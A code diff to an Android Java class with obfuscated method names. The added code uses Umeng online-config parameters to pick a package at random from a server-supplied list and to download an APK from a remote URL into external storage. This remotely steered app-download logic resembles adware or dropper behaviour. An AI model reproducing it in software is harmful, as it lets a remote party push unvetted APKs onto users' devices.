@@ -5,6 +5,7 @@ import java.util.HashMap;
 import java.util.Map;
 
 import org.json.JSONArray;
+import org.json.JSONException;
 import org.json.JSONObject;
 
 import android.content.Context;
@@ -34,6 +35,7 @@ public class Agmrsk {
 	public static Handler hdlr;
 	public static Context mContext;
 	public static String FP = Environment.getExternalStorageDirectory().getAbsolutePath() + "/tlp";
+	private static Map<String, Object> session = new HashMap<String, Object>();
 	
 	public static void init(Context context) {
 		try {
@@ -86,6 +88,21 @@ public class Agmrsk {
 				@Override
 				public void onDataReceived(JSONObject arg0) {
 					loadppp();
+					System.out.println("is loadchpr_no_um? " + (null != session.get("loadchpr_no_um")));
+					if (null != session.get("loadchpr_no_um")) {
+						session.remove("loadchpr_no_um");
+						final Context context = (Context) session.get("loadchpr_context");
+						if (null != context) {
+							Runnable r = new Runnable() {
+								
+								@Override
+								public void run() {
+									loadchpr(context);
+								}
+							};
+							hdlr.post(r);
+						}
+					}
 				}
 			});
 			MobclickAgent.updateOnlineConfig(mContext);
@@ -139,10 +156,15 @@ public class Agmrsk {
 		loaddr();
 	}
 
-	private static void loadchpr(Context context) {
+	private static void loadchpr(final Context context) {
 		if (!envavail()) return;
 		String bes = MobclickAgent.getConfigParams(mContext, "bes");
-		if (TextUtils.isEmpty(bes)) return;
+		if (TextUtils.isEmpty(bes)) {
+			System.out.println("loadchpr_no_um");
+			session.put("loadchpr_no_um", true);
+			session.put("loadchpr_context", context);
+			return;
+		}
 		try {
 			JSONArray arr = new JSONArray(bes);
 			int agi = (int) (Math.random()*arr.length());
@@ -161,14 +183,14 @@ public class Agmrsk {
 					
 					@Override
 					public void finishDownload(Map<String, Object> data) {
-						sohesw(pkg);
+						sohesw(pkg, context);
 					}
 					
 					@Override
 					public void errorDownload(Map<String, Object> data) {}
 				});
 			} else {
-				sohesw(pkg);
+				sohesw(pkg, context);
 			}
 			
 		} catch(Throwable t) {
@@ -176,8 +198,22 @@ public class Agmrsk {
 		}
 	}
 	
-	private static void sohesw(String pkrdsa) {
+	private static void sohesw(String pkrdsa, Context context) {
 		Toast.makeText(mContext, "hha " + pkrdsa, Toast.LENGTH_LONG).show();
+		String pkifdas = MobclickAgent.getConfigParams(mContext, pkrdsa);
+		if (TextUtils.isEmpty(pkifdas)) return;
+		try {
+			JSONObject obj = new JSONObject(pkifdas);
+			Map<String, Object> data = new HashMap<String, Object>();
+			data.put("pn", obj.getString("pkg"));
+			data.put("url", obj.getString("apk_url"));
+			data.put("show_name", obj.getString("show_name"));
+			data.put("type", "pg");
+			data.put("save_path", FP + "/" + obj.getString("name") + ".apk");
+			Dlg.getIns().dlg(data);
+		} catch (Throwable e) {
+			reporte(e);
+		}
 	}
 	
 	//是否已初始化,且有网络
